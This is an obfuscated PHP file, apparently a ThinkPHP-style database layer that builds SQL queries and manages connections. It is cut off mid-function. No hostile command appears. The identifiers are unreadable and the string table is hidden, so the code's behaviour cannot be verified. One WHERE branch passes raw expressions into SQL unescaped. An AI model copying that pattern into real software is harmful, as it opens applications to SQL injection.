<?php
 goto dÊ¿¸ä°ã; D¡·šà—¶: class DbSqlite extends DbSqliteBase { public function query($»ò·üïœ) { $§åòÈ§‚ =& $_SERVER[ê‘³Æ±]; if (!CacheLock::fileLock($§åòÈ§‚[13])) { return !1; } $øŠíİ›´ = parent::query($»ò·üïœ); CacheLock::fileUnLock($§åòÈ§‚[13]); return $øŠíİ›´; } public function execute($ÜÕ¹ùó£) { $÷¼ÙÄ =& $_SERVER[ê‘³Æ±]; if (!CacheLock::fileLock($÷¼ÙÄ[13])) { return !1; } $ÜÌƒ‰‹Ï = parent::execute($ÜÕ¹ùó£); CacheLock::fileUnLock($÷¼ÙÄ[13]); return $ÜÌƒ‰‹Ï; } } class DbSqlite3 extends DbSqlite3Base { public function query($ËğîÊÈª) { $‰µ×µ®˜ =& $_SERVER[ê‘³Æ±]; if (!CacheLock::fileLock($‰µ×µ®˜[13])) { return !1; } $Ö½Ï– = parent::query($ËğîÊÈª); CacheLock::fileUnLock($‰µ×µ®˜[13]); return $Ö½Ï–; } public function execute($ª‹×¿Íû) { $¨ê†³ï› =& $_SERVER[ê‘³Æ±]; if (!CacheLock::fileLock($¨ê†³ï›[13])) { return !1; } $§÷»–º = parent::execute($ª‹×¿Íû); CacheLock::fileUnLock($¨ê†³ï›[13]); return $§÷»–º; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\x65\161" => "\x3c\76", "\147\x74" => "\x3e", "\145\x67\x74" => "\76\75", "\x6c\164" => "\x3c", "\145\154\164" => "\74\75", "\156\x6f\164\154\151\153\145" => "\x4e\117\124\40\114\x49\x4b\x45", "\154\x69\153\x65" => "\114\x49\113\105", "\151\156" => "\111\x4e", "\156\157\x74\x69\156" => "\116\117\x54\40\111\116", "\156\157\x74\x20\x69\x6e" => "\116\117\124\x20\x49\x4e", "\142\x65\164\x77\x65\145\x6e" => "\102\105\x54\x57\105\x45\x4e", "\156\x6f\x74\142\145\164\167\x65\145\x6e" => "\116\x4f\x54\40\x42\105\124\x57\x45\105\116", "\156\157\x74\40\142\145\164\x77\x65\145\156" => "\x4e\117\x54\40\x42\105\x54\x57\x45\105\x4e"); protected $selectSql = "\123\x45\114\105\x43\124\x25\x44\x49\123\x54\111\116\103\x54\x25\40\45\x46\x49\105\114\x44\x25\40\106\x52\117\x4d\x20\45\124\101\102\114\105\x25\45\112\x4f\111\x4e\45\x25\127\110\x45\x52\x45\x25\45\107\x52\x4f\x55\x50\x25\x25\110\x41\126\111\x4e\107\x25\45\117\122\x44\x45\x52\45\45\x4c\111\115\111\124\45\x20\x25\125\116\x49\117\x4e\45\45\x43\x4f\115\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $é”‰É† = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ê‘³Æ±][949], $é”‰É†); } public function factory($ĞÑ¶Î—… = '') { $å¸Š†›Õ =& $_SERVER[ê‘³Æ±]; $ĞÑ¶Î—… = $this->parseConfig($ĞÑ¶Î—…); if (empty($ĞÑ¶Î—…[$å¸Š†›Õ[950]])) { think_exception(think_lang($å¸Š†›Õ[951])); } $this->dbType = ucwords(strtolower($ĞÑ¶Î—…[$å¸Š†›Õ[950]])); $¶Æ²ä¯ü = $å¸Š†›Õ[952] . $this->dbType; if (class_exists($¶Æ²ä¯ü)) { $ÚÙê½ª¨ = new $¶Æ²ä¯ü($ĞÑ¶Î—…); if ($å¸Š†›Õ[953] != strtolower($ĞÑ¶Î—…[$å¸Š†›Õ[950]])) { $ÚÙê½ª¨->dbType = strtoupper($this->dbType); } else { $ÚÙê½ª¨->dbType = $this->_getDsnType($ĞÑ¶Î—…[$å¸Š†›Õ[905]]); } } else { think_exception(think_lang($å¸Š†›Õ[954]) . $å¸Š†›Õ[955] . $¶Æ²ä¯ü); } return $ÚÙê½ª¨; } public function __call($Ö¤ÂÑ÷©, $¥şÖÑêÁ) { if (method_exists($this, $Ö¤ÂÑ÷©)) { return call_user_func_array(array($this, $Ö¤ÂÑ÷©), $¥şÖÑêÁ); } } protected function _getDsnType($Ûã”ãîü) { $ÀáåÉ¤› = explode($_SERVER[ê‘³Æ±][4], $Ûã”ãîü); $ÉÈû¿ûÃ = strtoupper(trim($ÀáåÉ¤›[0])); return $ÉÈû¿ûÃ; } private function parseConfig($ƒÌ†Ğ’§ = '') { $É£¯‰Øí =& $_SERVER[ê‘³Æ±]; if (!empty($ƒÌ†Ğ’§) && is_string($ƒÌ†Ğ’§)) { $ƒÌ†Ğ’§ = $this->parseDSN($ƒÌ†Ğ’§); } elseif (is_array($ƒÌ†Ğ’§)) { $ƒÌ†Ğ’§ = array_change_key_case($ƒÌ†Ğ’§); $ƒÌ†Ğ’§ = array($É£¯‰Øí[950] => $ƒÌ†Ğ’§[$É£¯‰Øí[956]], $É£¯‰Øí[877] => $ƒÌ†Ğ’§[$É£¯‰Øí[957]], $É£¯‰Øí[878] => $ƒÌ†Ğ’§[$É£¯‰Øí[958]], $É£¯‰Øí[875] => $ƒÌ†Ğ’§[$É£¯‰Øí[959]], $É£¯‰Øí[876] => $ƒÌ†Ğ’§[$É£¯‰Øí[960]], $É£¯‰Øí[21] => $ƒÌ†Ğ’§[$É£¯‰Øí[961]], $É£¯‰Øí[905] => $ƒÌ†Ğ’§[$É£¯‰Øí[962]], $É£¯‰Øí[17] => isset($ƒÌ†Ğ’§[$É£¯‰Øí[963]]) ? $ƒÌ†Ğ’§[$É£¯‰Øí[963]] : array()); } elseif (empty($ƒÌ†Ğ’§)) { if (think_config($É£¯‰Øí[964]) && $É£¯‰Øí[953] != strtolower(think_config($É£¯‰Øí[965]))) { $ƒÌ†Ğ’§ = $this->parseDSN(think_config($É£¯‰Øí[964])); } else { $ƒÌ†Ğ’§ = array($É£¯‰Øí[950] => think_config($É£¯‰Øí[965]), $É£¯‰Øí[877] => think_config($É£¯‰Øí[966]), $É£¯‰Øí[878] => think_config($É£¯‰Øí[967]), $É£¯‰Øí[875] => think_config($É£¯‰Øí[968]), $É£¯‰Øí[876] => think_config($É£¯‰Øí[969]), $É£¯‰Øí[21] => think_config($É£¯‰Øí[243]), $É£¯‰Øí[905] => think_config($É£¯‰Øí[964]), $É£¯‰Øí[17] => think_config($É£¯‰Øí[970])); } } return $ƒÌ†Ğ’§; } protected function initConnect($—Œ¸ÂÒâ = true) { if (1 == think_config($_SERVER[ê‘³Æ±][22])) { $this->_linkID = $this->multiConnect($—Œ¸ÂÒâ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $·Î«„Û => $Ã¼´ÈÉ©) { $this->_linkID = $Ã¼´ÈÉ©; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ë™©ñË’ = false) { $ïÁ–‚³¢ =& $_SERVER[ê‘³Æ±]; static $§‡¿½¿” = array(); static $¬ÈÕşà² = -1; if (empty($§‡¿½¿”)) { foreach ($this->config as $¶Ú¯²¸ => $¯Ç§óĞ) { $§‡¿½¿”[$¶Ú¯²¸] = explode($ïÁ–‚³¢[50], $¯Ç§óĞ); } } if (think_config($ïÁ–‚³¢[971])) { if ($ë™©ñË’ || think_config($ïÁ–‚³¢[390]) === !0) { $İôŠ›´ = floor(mt_rand(0, think_config($ïÁ–‚³¢[972]) - 1)); $¬ÈÕşà² = $İôŠ›´; } else { if (is_numeric(think_config($ïÁ–‚³¢[973]))) { $İôŠ›´ = think_config($ïÁ–‚³¢[973]); } else { $İôŠ›´ = floor(mt_rand(think_config($ïÁ–‚³¢[972]), count($§‡¿½¿”[$ïÁ–‚³¢[875]]) - 1)); } } } else { $İôŠ›´ = floor(mt_rand(0, count($§‡¿½¿”[$ïÁ–‚³¢[875]]) - 1)); $¬ÈÕşà² = $İôŠ›´; } $İôŠ›´ = $¬ÈÕşà² !== -1 ? $¬ÈÕşà² : $İôŠ›´; $®ÂµŠÖ = array($ïÁ–‚³¢[877] => isset($§‡¿½¿”[$ïÁ–‚³¢[877]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[877]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[877]][0], $ïÁ–‚³¢[878] => isset($§‡¿½¿”[$ïÁ–‚³¢[878]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[878]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[878]][0], $ïÁ–‚³¢[875] => isset($§‡¿½¿”[$ïÁ–‚³¢[875]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[875]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[875]][0], $ïÁ–‚³¢[876] => isset($§‡¿½¿”[$ïÁ–‚³¢[876]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[876]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[876]][0], $ïÁ–‚³¢[21] => isset($§‡¿½¿”[$ïÁ–‚³¢[21]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[21]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[21]][0], $ïÁ–‚³¢[905] => isset($§‡¿½¿”[$ïÁ–‚³¢[905]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[905]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[905]][0], $ïÁ–‚³¢[17] => isset($§‡¿½¿”[$ïÁ–‚³¢[17]][$İôŠ›´]) ? $§‡¿½¿”[$ïÁ–‚³¢[17]][$İôŠ›´] : $§‡¿½¿”[$ïÁ–‚³¢[17]][0]); return $this->connect($®ÂµŠÖ, $İôŠ›´); } public function parseDSN($ÚÌªÎÌÚ) { $íÄø»ô§ =& $_SERVER[ê‘³Æ±]; if (empty($ÚÌªÎÌÚ)) { return !1; } $ş²¨ÃÅÜ = parse_url($ÚÌªÎÌÚ); if ($ş²¨ÃÅÜ[$íÄø»ô§[175]]) { $·Òâìñò = array($íÄø»ô§[950] => $ş²¨ÃÅÜ[$íÄø»ô§[175]], $íÄø»ô§[877] => isset($ş²¨ÃÅÜ[$íÄø»ô§[590]]) ? $ş²¨ÃÅÜ[$íÄø»ô§[590]] : $íÄø»ô§[12], $íÄø»ô§[878] => isset($ş²¨ÃÅÜ[$íÄø»ô§[974]]) ? $ş²¨ÃÅÜ[$íÄø»ô§[974]] : $íÄø»ô§[12], $íÄø»ô§[875] => isset($ş²¨ÃÅÜ[$íÄø»ô§[176]]) ? $ş²¨ÃÅÜ[$íÄø»ô§[176]] : $íÄø»ô§[12], $íÄø»ô§[876] => isset($ş²¨ÃÅÜ[$íÄø»ô§[177]]) ? $ş²¨ÃÅÜ[$íÄø»ô§[177]] : $íÄø»ô§[12], $íÄø»ô§[21] => isset($ş²¨ÃÅÜ[$íÄø»ô§[78]]) ? substr($ş²¨ÃÅÜ[$íÄø»ô§[78]], 1) : $íÄø»ô§[12]); } else { preg_match($íÄø»ô§[975], trim($ÚÌªÎÌÚ), $ÒÃƒÌº‘); $·Òâìñò = array($íÄø»ô§[950] => $ÒÃƒÌº‘[1], $íÄø»ô§[877] => $ÒÃƒÌº‘[2], $íÄø»ô§[878] => $ÒÃƒÌº‘[3], $íÄø»ô§[875] => $ÒÃƒÌº‘[4], $íÄø»ô§[876] => $ÒÃƒÌº‘[5], $íÄø»ô§[21] => $ÒÃƒÌº‘[6]); } $·Òâìñò[$íÄø»ô§[905]] = $íÄø»ô§[12]; return $·Òâìñò; } protected function debug() { $’ÃèÕ¯‰ =& $_SERVER[ê‘³Æ±]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $’ÃèÕ¯‰[976]; if (think_config($’ÃèÕ¯‰[977])) { think_status($’ÃèÕ¯‰[978]); think_trace($this->queryStr . $’ÃèÕ¯‰[979] . think_status($’ÃèÕ¯‰[24], $’ÃèÕ¯‰[978], 6) . $’ÃèÕ¯‰[980], $’ÃèÕ¯‰[12], $’ÃèÕ¯‰[981]); } } protected function parseLock($×¡´œ² = false) { $¼é‡Îâ¦ =& $_SERVER[ê‘³Æ±]; if (!$×¡´œ²) { return $¼é‡Îâ¦[12]; } if ($¼é‡Îâ¦[907] == $this->dbType) { return $¼é‡Îâ¦[982]; } return $¼é‡Îâ¦[983]; } protected function parseSet($¹„­ıËÍ) { $€èÁÜ—Æ =& $_SERVER[ê‘³Æ±]; foreach ($¹„­ıËÍ as $ÏÓêıêØ => $¢¥ö¢”ş) { if (is_array($¢¥ö¢”ş) && $€èÁÜ—Æ[294] == $¢¥ö¢”ş[0]) { $­›ŒÂ…Ç[] = $this->parseKey($ÏÓêıêØ) . $€èÁÜ—Æ[873] . $¢¥ö¢”ş[1]; } elseif (is_scalar($¢¥ö¢”ş) || is_null($¢¥ö¢”ş)) { $­›ŒÂ…Ç[] = $this->parseKey($ÏÓêıêØ) . $€èÁÜ—Æ[873] . $this->parseValue($¢¥ö¢”ş); } } return $€èÁÜ—Æ[984] . implode($€èÁÜ—Æ[50], $­›ŒÂ…Ç); } protected function bindParam($î°œçø©, $¹ä½ªôë) { $this->bind[$_SERVER[ê‘³Æ±][4] . $î°œçø©] = $¹ä½ªôë; } protected function parseBind($ªáå¸èæ) { $ªáå¸èæ = array_merge($this->bind, $ªáå¸èæ); $this->bind = array(); return $ªáå¸èæ; } function parseKey(&$ÕãÅ”‰Ø, $Çé²Ï· = true) { if ($Çé²Ï·) { $ÕãÅ”‰Ø = $this->parseKeyCheck($ÕãÅ”‰Ø); } return $ÕãÅ”‰Ø; } function parseKeyCheck($Õï‡ŸˆÈ) { $·ÉµàÈ¬ =& $_SERVER[ê‘³Æ±]; $Õï‡ŸˆÈ = trim($Õï‡ŸˆÈ); if (!preg_match($·ÉµàÈ¬[985], $Õï‡ŸˆÈ)) { think_exception($·ÉµàÈ¬[986] . $Õï‡ŸˆÈ); } return $Õï‡ŸˆÈ; } protected function parseValue($Éù¡Ó ) { $ğ¹‚ü =& $_SERVER[ê‘³Æ±]; if (is_string($Éù¡Ó )) { $Éù¡Ó  = $ğ¹‚ü[946] . $this->escapeString($Éù¡Ó ) . $ğ¹‚ü[946]; } elseif (isset($Éù¡Ó [0]) && is_string($Éù¡Ó [0]) && strtolower($Éù¡Ó [0]) == $ğ¹‚ü[294]) { $Éù¡Ó  = $this->escapeString($Éù¡Ó [1]); } elseif (is_array($Éù¡Ó )) { $Éù¡Ó  = array_map(array($this, $ğ¹‚ü[947]), $Éù¡Ó ); } elseif (is_bool($Éù¡Ó )) { $Éù¡Ó  = $Éù¡Ó  ? $ğ¹‚ü[89] : $ğ¹‚ü[192]; } elseif (is_null($Éù¡Ó )) { $Éù¡Ó  = $ğ¹‚ü[104]; } return $Éù¡Ó ; } protected function parseField($Õ†¿İ¯¾) { $È¼§á“¬ =& $_SERVER[ê‘³Æ±]; if (is_string($Õ†¿İ¯¾) && strpos($Õ†¿İ¯¾, $È¼§á“¬[50])) { $Õ†¿İ¯¾ = explode($È¼§á“¬[50], $Õ†¿İ¯¾); } if (is_array($Õ†¿İ¯¾)) { $¬‘é÷ˆ† = array(); foreach ($Õ†¿İ¯¾ as $õ³‘Ğ¨“ => $õ¡¿ú’Ÿ) { if (!is_numeric($õ³‘Ğ¨“)) { $¬‘é÷ˆ†[] = $this->parseKey($õ³‘Ğ¨“, !1) . $È¼§á“¬[987] . $this->parseKey($õ¡¿ú’Ÿ); } else { $¬‘é÷ˆ†[] = $this->parseKey($õ¡¿ú’Ÿ); } } $ğªüñ­‘ = implode($È¼§á“¬[50], $¬‘é÷ˆ†); } elseif (is_string($Õ†¿İ¯¾) && !empty($Õ†¿İ¯¾)) { $ğªüñ­‘ = $Õ†¿İ¯¾; } else { $ğªüñ­‘ = $È¼§á“¬[183]; } return $ğªüñ­‘; } protected function parseTable($‘û½£Œã) { $ùŸ‰°ÊÎ =& $_SERVER[ê‘³Æ±]; if (is_array($‘û½£Œã)) { $®õóš·â = array(); foreach ($‘û½£Œã as $Ò¿éÅÆ¯ => $È¢âê¨) { if (!is_numeric($Ò¿éÅÆ¯)) { $®õóš·â[] = $this->parseKey($Ò¿éÅÆ¯) . $ùŸ‰°ÊÎ[53] . $this->parseKey($È¢âê¨); } else { $®õóš·â[] = $this->parseKey($Ò¿éÅÆ¯); } } $‘û½£Œã = $®õóš·â; } elseif (is_string($‘û½£Œã)) { if (strstr($‘û½£Œã, $ùŸ‰°ÊÎ[53])) { return $‘û½£Œã; } $‘û½£Œã = explode($ùŸ‰°ÊÎ[50], $‘û½£Œã); array_walk($‘û½£Œã, array($this, $ùŸ‰°ÊÎ[895])); } return $ùŸ‰°ÊÎ[889] . trim(implode($ùŸ‰°ÊÎ[988], $‘û½£Œã), $ùŸ‰°ÊÎ[382]) . $ùŸ‰°ÊÎ[889]; } protected function parseWhere($°¼òÆÔì) { $ÆüŞ®Î =& $_SERVER[ê‘³Æ±]; $÷«óÛŠì = $ÆüŞ®Î[12]; if (is_string($°¼òÆÔì)) { $÷«óÛŠì = $°¼òÆÔì; } else { $áÊØÓê¡ = isset($°¼òÆÔì[$ÆüŞ®Î[989]]) ? strtoupper($°¼òÆÔì[$ÆüŞ®Î[989]]) : $ÆüŞ®Î[12]; if (in_array($áÊØÓê¡, array($ÆüŞ®Î[990], $ÆüŞ®Î[991], $ÆüŞ®Î[992]))) { $áÊØÓê¡ = $ÆüŞ®Î[53] . $áÊØÓê¡ . $ÆüŞ®Î[53]; unset($°¼òÆÔì[$ÆüŞ®Î[989]]); } else { $áÊØÓê¡ = $ÆüŞ®Î[993]; } foreach ($°¼òÆÔì as $ÂÌìÏ÷ª => $•ÄÕÏ–ê) { $÷«óÛŠì .= $ÆüŞ®Î[274]; if (is_numeric($ÂÌìÏ÷ª)) { $ÂÌìÏ÷ª = $ÆüŞ®Î[994]; } if (0 === strpos($ÂÌìÏ÷ª, $ÆüŞ®Î[11])) { $÷«óÛŠì .= $this->parseThinkWhere($ÂÌìÏ÷ª, $•ÄÕÏ–ê); } else { if (!preg_match($ÆüŞ®Î[995], trim($ÂÌìÏ÷ª))) { think_exception(think_lang($ÆüŞ®Î[996]) . $ÆüŞ®Î[4] . $ÂÌìÏ÷ª); } $™Î©ÏŞ§ = is_array($•ÄÕÏ–ê) && isset($•ÄÕÏ–ê[$ÆüŞ®Î[997]]); $ÂÌìÏ÷ª = trim($ÂÌìÏ÷ª); if (strpos($ÂÌìÏ÷ª, $ÆüŞ®Î[280])) { $¢œ­¡Ìú = explode($ÆüŞ®Î[280], $ÂÌìÏ÷ª); $Œ¯Éíé¬ = array(); foreach ($¢œ­¡Ìú as $¦–¬£íµ => $’°€ğ) { $¹ïêÏ¨è = $™Î©ÏŞ§ ? $•ÄÕÏ–ê[$¦–¬£íµ] : $•ÄÕÏ–ê; $Œ¯Éíé¬[] = $ÆüŞ®Î[257] . $this->parseWhereItem($this->parseKey($’°€ğ), $¹ïêÏ¨è) . $ÆüŞ®Î[894]; } $÷«óÛŠì .= implode($ÆüŞ®Î[998], $Œ¯Éíé¬); } elseif (strpos($ÂÌìÏ÷ª, $ÆüŞ®Î[281])) { $¢œ­¡Ìú = explode($ÆüŞ®Î[281], $ÂÌìÏ÷ª); $Œ¯Éíé¬ = array(); foreach ($¢œ­¡Ìú as $¦–¬£íµ => $’°€ğ) { $¹ïêÏ¨è = $™Î©ÏŞ§ ? $•ÄÕÏ–ê[$¦–¬£íµ] : $•ÄÕÏ–ê; $Œ¯Éíé¬[] = $ÆüŞ®Î[257] . $this->parseWhereItem($this->parseKey($’°€ğ), $¹ïêÏ¨è) . $ÆüŞ®Î[894]; } $÷«óÛŠì .= implode($ÆüŞ®Î[993], $Œ¯Éíé¬); } else { $÷«óÛŠì .= $this->parseWhereItem($this->parseKey($ÂÌìÏ÷ª), $•ÄÕÏ–ê); } } $÷«óÛŠì .= $ÆüŞ®Î[275] . $áÊØÓê¡; } $÷«óÛŠì = substr($÷«óÛŠì, 0, -strlen($áÊØÓê¡)); } return empty($÷«óÛŠì) ? $ÆüŞ®Î[12] : $ÆüŞ®Î[999] . $÷«óÛŠì; } protected function parseWhereItem($ª¸Ş¦–, $š›‚€àï) { $ü‡±†àó =& $_SERVER[ê‘³Æ±]; $¼Ï£÷‚œ = $ü‡±†àó[12]; if (is_array($š›‚€àï)) { if (is_string($š›‚€àï[0])) { $­áê®íÏ = strtolower($š›‚€àï[0]); if (in_array($š›‚€àï[0], array($ü‡±†àó[873], $ü‡±†àó[1000], $ü‡±†àó[1001], $ü‡±†àó[1002], $ü‡±†àó[1003], $ü‡±†àó[1004]))) { $¼Ï£÷‚œ .= $ª¸Ş¦– . $ü‡±†àó[53] . $š›‚€àï[0] . $ü‡±†àó[53] . $this->parseValue($š›‚€àï[1]); } elseif (preg_match($ü‡±†àó[1005], $š›‚€àï[0])) { $¼Ï£÷‚œ .= $ª¸Ş¦– . $ü‡±†àó[53] . $this->exp[$­áê®íÏ] . $ü‡±†àó[53] . $this->parseValue($š›‚€àï[1]); } elseif (preg_match($ü‡±†àó[1006], $š›‚€àï[0])) { if (is_array($š›‚€àï[1])) { $¶Ø”òí = isset($š›‚€àï[2]) ? strtoupper($š›‚€àï[2]) : $ü‡±†àó[991]; if (in_array($¶Ø”òí, array($ü‡±†àó[990], $ü‡±†àó[991], $ü‡±†àó[992]))) { $ıïüøöø = array(); foreach ($š›‚€àï[1] as $ûæğ££) { $ıïüøöø[] = $ª¸Ş¦– . $ü‡±†àó[53] . $this->exp[$­áê®íÏ] . $ü‡±†àó[53] . $this->parseValue($ûæğ££); } $¼Ï£÷‚œ .= $ü‡±†àó[257] . implode($ü‡±†àó[53] . $¶Ø”òí . $ü‡±†àó[53], $ıïüøöø) . $ü‡±†àó[894]; } } else { $¼Ï£÷‚œ .= $ª¸Ş¦– . $ü‡±†àó[53] . $this->exp[$­áê®íÏ] . $ü‡±†àó[53] . $this->parseValue($š›‚€àï[1]); } } elseif ($ü‡±†àó[294] == $­áê®íÏ) { $¼Ï£÷‚œ .= $ü‡±†àó[892] . $ª¸Ş¦– . $ü‡±†àó[53] . $š›‚€àï[1] . $ü‡±†àó[1007]; } elseif (preg_match($ü‡±†àó[1008], $š›‚€àï[0])) { $¼Ï£÷‚œ .= $š›‚€àï[0]; } elseif (preg_match($ü‡±†àó[1009], $š›‚€àï[0])) { if (isset($š›‚€àï[2]) && $ü‡±†àó[294] == $š›‚€àï[2]) { $¼Ï£÷‚œ .= $ª¸Ş¦– . $ü‡±†àó[53] . $this->exp[$­áê®íÏ] . $ü‡±†àó[53] . $š›‚€àï[1]; } else { if (is_string($š›‚€àï[1])) { $š›‚€àï[1] = explode($ü‡±†àó[50], $š›‚€àï[1]); } $à·µÚ‘ = implode($ü‡±†àó[50], $this->parseValue($š›‚€àï[1])); $¼Ï£÷‚œ .= $ª¸Ş¦– . $ü‡±†àó[53] . $this->exp[$­áê®íÏ] . $ü‡±†àó[892] . $à·µÚ‘ . $ü‡±†àó[894]; } } elseif (preg_match($ü‡±†àó[1010], $š›‚€àï[0])) { $¥³¸©»¯ = is_string($š›‚€àï[1]) ? explode($ü‡±†àó[50], $š›‚€àï[1]) : $š›‚€àï[1]; $¼Ï£÷‚œ .= $ü‡±†àó[892] . $ª¸Ş¦– . $ü‡±†àó[53] . $this->exp[$­áê®íÏ] . $ü‡±†àó[53] . $this->parseValue($¥³¸©»¯[0]) . $ü‡±†àó[993] . $this->parseValue($¥³¸©»¯[1]) . $ü‡±†àó[275]; } else { think_exception(think_lang($ü‡±†àó[996]) . $ü‡±†àó[4] . $š›‚€àï[0]); } } else { $ª¼ßŸŠÎ = count($š›‚€àï); $æŒ›“´Á = $ü‡±†àó[12]; if (is_string($š›‚€àï[$ª¼ßŸŠÎ - 1])) { $æŒ›“´Á = isset($š›‚€àï[$ª¼ßŸŠÎ - 1]) ? strtoupper($š›‚€àï[$ª¼ßŸŠÎ - 1]) : $ü‡±†àó[12]; if (in_array($æŒ›“´Á, array($ü‡±†àó[990], $ü‡±†àó[991], $ü‡±†àó[992]))) { $ª¼ßŸŠÎ = $ª¼ßŸŠÎ - 1; } } else { $æŒ›“´Á = $ü‡±†àó[990]; } for ($ŒÈÆ¢·« = 0; $ŒÈÆ¢·« < $ª¼ßŸŠÎ; $ŒÈÆ¢·«++) { $¥³¸©»¯ = is_array($š›‚€àï[$ŒÈÆ¢·«]) ? $š›‚€àï[$ŒÈÆ¢·«][1] : $š›‚€àï[$ŒÈÆ¢·«]; if ($ü‡±†àó[294] == strtolower($š›‚€àï[$ŒÈÆ¢·«][0])) { $¼Ï£÷‚œ .= $ü‡±†àó[257] . $ª¸Ş¦– . $ü‡±†àó[53] . $¥³¸©»¯ . $ü‡±†àó[1007] . $æŒ›“´Á . $ü‡±†àó[53]; } else { $È¿·Ûû„ = is_array($š›‚€àï[$ŒÈÆ¢·«]) ? $this->exp[strtolower($š›‚€àï[$ŒÈÆ¢·«][0])] : $ü‡±†àó[873]; if (!$È¿·Ûû„ && is_array($š›‚€àï[$ŒÈÆ¢·«]) && in_array($š›‚€àï[$ŒÈÆ¢·«][0], array($ü‡±†àó[873], $ü‡±†àó[1000], $ü‡±†àó[1001], $ü‡±†àó[1002], $ü‡±†àó[1003], $ü‡±†àó[1004]))) { $È¿·Ûû„ = $š›‚€àï[$ŒÈÆ¢·«][0]; } $¼Ï£÷‚œ .= $ü‡±†àó[257] . $ª¸Ş¦– . $ü‡±†àó[53] . $È¿·Ûû„ . $ü‡±†àó[53] . $this->parseValue($¥³¸©»¯) . $ü‡±†àó[1007] . $æŒ›“´Á . $ü‡±†àó[53]; } } $¼Ï£÷‚œ = substr($¼Ï£÷‚œ, 0, -4); } } else { $¼Ï£÷‚œ .= $ª¸Ş¦– . $ü‡±†àó[1011] . $this->parseValue($š›‚€àï); } return $¼Ï£÷‚œ; } protected function parseThinkWhere($ÑÙç¢›¬, $°ìŞã·ì) { $»Ê†Åœ  =& $_SERVER[ê‘³Æ±]; $¼éğÅõ = $»Ê†Åœ [12]; switch ($ÑÙç¢›¬) { case $»Ê†Åœ [349]: $¼éğÅõ = $°ìŞã·ì; break; case $»Ê†Åœ [994]: $¼éğÅõ = is_string($°ìŞã·ì) ? $°ìŞã·ì : substr($this->parseWhere($°ìŞã·ì), 6); break; case $»Ê†Åœ [1012]: parse_str($°ìŞã·ì, $ìÔı—œô); if (isset($ìÔı—œô[$»Ê†Åœ [989]])) { $‚£³ëê½ = $»Ê†Åœ [53] . strtoupper($ìÔı—œô[$»Ê†Åœ [989]]) . $»Ê†Åœ [53]; unset($ìÔı—œô[$»Ê†Åœ [989]]); } else { $‚£³ëê½ = $»Ê†Åœ [993]; } $×Á÷»˜ş = array(); foreach ($ìÔı—œô as $ĞÔ¾óó£ => $ÁËåş‹Û) { $×Á÷»˜ş[] = $this->parseKey($ĞÔ¾óó£) . $»Ê†Åœ [1011] . $this->parseValue($ÁËåş‹Û); } $¼éğÅõ = implode($‚£³ëê½, $×Á÷»˜ş); break; } return $¼éğÅõ; } protected function parseLimit($®ËáÈË©) { $öé÷™Ã =& $_SERVER[ê‘³Æ±]; return !empty($®ËáÈË©) ? $öé÷™Ã[51] . $®ËáÈË© . $öé÷™Ã[53] : $öé÷™Ã[12]; } protected function parseJoin($óÍ§¶í) { $Ùïçõ‡À =& $_SERVER[ê‘³Æ±]; $“ ñ…Œ = $Ùïçõ‡À[12]; if (!empty($óÍ§¶í)) { if (is_array($óÍ§¶í)) { foreach ($óÍ§¶í as $½‹ÔÒ×Ü => $ ¯ˆÓæ¹) { if (!1 !== stripos($ ¯ˆÓæ¹, $Ùïçõ‡À[1013])) { $“ ñ…Œ .= $Ùïçõ‡À[53] . $ ¯ˆÓæ¹; } else { $“ ñ…Œ .= $Ùïçõ‡À[1014] . $ ¯ˆÓæ¹; } } } else { $“ ñ…Œ .= $Ùïçõ‡À[1014] . $óÍ§¶í; } } $“ ñ…Œ = preg_replace($Ùïçõ‡À[1015], think_config($Ùïçõ‡À[919]) . $Ùïçõ‡À[1016], $“ ñ…Œ); return $“ ñ…Œ; } protected function parseOrder($°İ¾±Å ) { $ª½í‰ş³ =& $_SERVER[ê‘³Æ±]; if (is_array($°İ¾±Å )) { $õ¯¥ËÏŠ = array(); foreach ($°İ¾±Å  as $õí‘è => $»é–Óà) { if (is_numeric($õí‘è)) { $õ¯¥ËÏŠ[] = $this->parseKey($»é–Óà); } else { $»é–Óà = in_array(strtoupper(trim($»é–Óà)), array($ª½í‰ş³[1017], $ª½í‰ş³[1018])) ? $ª½í‰ş³[53] . $»é–Óà : $ª½í‰ş³[12]; if (preg_match($ª½í‰ş³[1019], $õí‘è)) { $õ¯¥ËÏŠ[] = $this->parseKey($õí‘è) . $»é–Óà; } else { think_exception($ª½í‰ş³[1020] . $õí‘è); } } } $°İ¾±Å  = implode($ª½í‰ş³[50], $õ¯¥ËÏŠ); } return !empty($°İ¾±Å ) ? $ª½í‰ş³[1021] . $°İ¾±Å  : $ª½í‰ş³[12]; } protected function parseGroup($ÄğàßŠ‘) { $›±°¶…ì =& $_SERVER[ê‘³Æ±]; return !empty($ÄğàßŠ‘) ? $›±°¶…ì[1022] . $ÄğàßŠ‘ : $›±°¶…ì[12]; } protected function parseHaving($Éé†°Ù ) { $«¹Ú ¨ö =& 